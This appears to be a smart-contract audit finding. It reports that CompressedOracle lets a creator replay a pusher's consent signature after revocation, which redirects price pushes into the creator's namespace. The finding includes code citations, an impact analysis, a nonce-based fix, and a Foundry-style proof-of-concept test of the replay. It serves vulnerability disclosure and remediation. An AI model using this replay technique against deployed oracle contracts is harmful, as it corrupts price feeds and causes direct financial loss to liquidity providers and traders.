### Title
Revoked pusher delegation can be silently re-established by replaying the original consent signature, redirecting price pushes into the creator's namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` verifies a pusher's EIP-191 consent signature but includes **no nonce and no used-signature tracking**. The signed payload is `(block.chainid, address(this), deadline, pusher, msg.sender)`. Because the same bytes produce the same valid signature every time, a creator can replay the identical signature after the pusher has called `revokePusher()`, silently re-establishing the delegation. The pusher's revocation is therefore not final for the entire lifetime of the deadline window.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no per-signature consumed flag, and no on-chain record that the pusher later revoked. `revokePusher` simply zeroes the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [2](#0-1) 

Because the original signature is still cryptographically valid until `deadline`, the creator can immediately call `allowPushers` again with the same `(deadline, [pusher], [sig])` arguments, writing `namespaceRemapping[pusher] = creator` back. The code's own comment acknowledges the risk but treats the deadline as the sole mitigation:

> *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* [3](#0-2) 

The deadline only bounds the outer window; it does **not** prevent replay within that window.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the revoked-but-re-delegated pusher makes after revocation lands in the **creator's namespace** instead of the pusher's own namespace, with no indication to the pusher that their revocation was undone.

---

### Impact Explanation

After the creator replays the signature:

1. The pusher, believing they have revoked, begins pushing prices for their **own** feeds (different assets, different slot/position layout, or different price scale).
2. Those pushes are silently redirected into the creator's namespace at the same slot/position coordinates.
3. `getOracleData` decodes the raw packed slot and returns the pusher's new (wrong-asset) price as the creator's feed price.
4. Any pool whose `AnchoredPriceProvider` or `CompressedOracle` provider reads that feedId receives a **stale, inverted, or wrong-asset bid/ask quote**.
5. Swaps execute against the corrupted price → traders receive more output than the curve permits or LPs receive less input than owed → direct loss of LP principal or swap conservation failure.

This satisfies the allowed impact gate: **bad-price execution** and **swap conservation failure** causing direct loss of user principal.

---

### Likelihood Explanation

- The creator already holds the pusher's signed consent (they used it once to establish the delegation).
- Replaying it costs only gas — no additional off-chain coordination is needed.
- The pusher has no on-chain mechanism to invalidate the signature before the deadline expires.
- A pusher who revokes and then resumes pushing (for their own namespace) is the normal operational pattern after a relationship ends, making the trigger realistic.

Likelihood: **Medium** (requires a creator who acts adversarially after the pusher revokes, but the capability is always present for the full deadline window).

---

### Recommendation

Add a per-pusher revocation nonce or a consumed-signature set so that a revocation permanently invalidates all prior consent signatures:

```solidity
// Track revocation generation per pusher
mapping(address => uint256) public pusherNonce;

// In revokePusher():
pusherNonce[msg.sender]++;

// In allowPushers(), include the nonce in the signed digest:
keccak256(abi.encode(
    block.chainid,
    address(this),
    deadline,
    pusher,
    msg.sender,
    pusherNonce[pusher]   // ← new field
))
```

Alternatively, record each consumed `(pusher, deadline, creator)` triple in a `mapping(bytes32 => bool) usedConsents` and reject replays.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 1 day
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator);

// 3. Pusher revokes — expects to push into own namespace from now on
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0));

// 4. Creator replays the SAME signature — no new consent needed
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
// Delegation is silently re-established
assertEq(oracle.namespaceRemapping(pusher), creator);  // ← passes

// 5. Pusher pushes prices for their own asset (thinking they're in own namespace)
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 wrongAssetRaw = _packRaw(999_999, 5, 5); // wrong-asset price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, wrongAssetRaw, tsMs));
assertTrue(ok);

// 6. Wrong price lands in creator's namespace — pool reads corrupted quote
IOffchainOracle.OracleData memory data =
    oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
// data.price == U64x32.decode(wrongAssetRaw >> 16)  ← wrong-asset price
// pusher's own namespace is empty
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
